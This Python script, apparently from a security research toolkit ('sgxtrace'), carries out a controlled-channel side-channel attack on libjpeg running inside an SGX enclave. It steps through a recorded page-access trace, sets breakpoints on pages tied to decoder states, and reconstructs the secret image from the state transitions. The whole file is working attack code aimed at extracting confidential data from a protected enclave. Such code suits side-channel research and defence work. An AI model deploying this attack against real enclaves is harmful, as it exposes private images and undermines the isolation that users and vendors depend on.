from sgxtrace import load_vcd_trace, TraceNavigator
from sgxtrace.jpeg import JpegAttackConfig, JpegReconstruction, JpegState, JpegAttackResult

TRACE = "traces/trace_libjpeg.vcd"
OUTPUT_IMAGE = "output/jpeg_reconstruction_navigator.pgm"

def run_jpeg_attack_with_navigator():
    """
    JPEG attack using TraceNavigator with breakpoints.
    This demonstrates using the navigator for efficient jumping between interesting pages.
    """
    print("--- JPEG RECONSTRUCTION ATTACK (TraceNavigator Version) ---")

    trace = load_vcd_trace(TRACE)
    config = JpegAttackConfig(
        start_range=range(54, 55),
        next_row_range=range(44, 45),
        start_row_range=range(58, 59),
        pre_idct_slow_range=range(56, 57),
        idct_slow_range=range(62, 64),
        data_count_range_no_aexnotify=range(154, 157),
        num_colors=1,
        aexnotify=False,
    )

    nav = TraceNavigator(trace)
    reconstruction = JpegReconstruction(num_colors=config.num_colors)

    # Set breakpoints for all interesting pages
    interesting_pages = set()
    for state in JpegState:
        for page_num in config.pages_for_state(state):
            page_name = f"_{page_num}"
            nav.add_breakpoint(page_name)
            interesting_pages.add(page_name)

    print(f"Set breakpoints on {len(interesting_pages)} pages")

    state = JpegState.PRE_START
    data_counter = 0
    processed_pages = 0

    while True:
        # Efficiently jump to next interesting page
        result = nav.page_step()

        if result.end_of_trace:
            break

        if result.breakpoint_hit:
            page_name = result.breakpoint_hit
            page_number = int(page_name[1:])  # Remove '_' prefix

            prev_state = state
            new_state = config.next_state(state, page_number)

            # Update data counter
            if prev_state == JpegState.IDCT_SLOW and new_state == JpegState.DATA_COUNT:
                data_counter = 1
            elif prev_state == JpegState.DATA_COUNT and new_state == JpegState.DATA_COUNT:
                data_counter += 1

            # Reconstruct based on state transition
            reconstruction.reconstruct_transition(prev_state, new_state, data_counter)

            if prev_state == JpegState.DATA_COUNT and new_state != JpegState.DATA_COUNT:
                data_counter = 0

            state = new_state
            processed_pages += 1

            if processed_pages % 1000 == 0:
                print(f"Processed {processed_pages} breakpoints, current state: {state.value}")

    # Handle final block if needed
    if state == JpegState.DATA_COUNT and data_counter > 0:
        reconstruction.reconstruct_block(data_counter)

    # Create result and save
    result = JpegAttackResult(
        config=config,
        reconstruction=reconstruction,
        final_state=state,
        processed_pages=processed_pages,
    )

    result.save_image(OUTPUT_IMAGE)

    width, height = reconstruction.reconstructed_size()
    print(f"Processed breakpoints: {processed_pages}")
    print(f"Final state:     {state.value}")
    print(f"Image size:      {width} x {height} blocks")
    print(f"Image saved:     {OUTPUT_IMAGE}")
    print(f"Min data count:  {reconstruction.min_data}")
    print(f"Max data count:  {reconstruction.max_data}")

if __name__ == "__main__":
    run_jpeg_attack_with_navigator()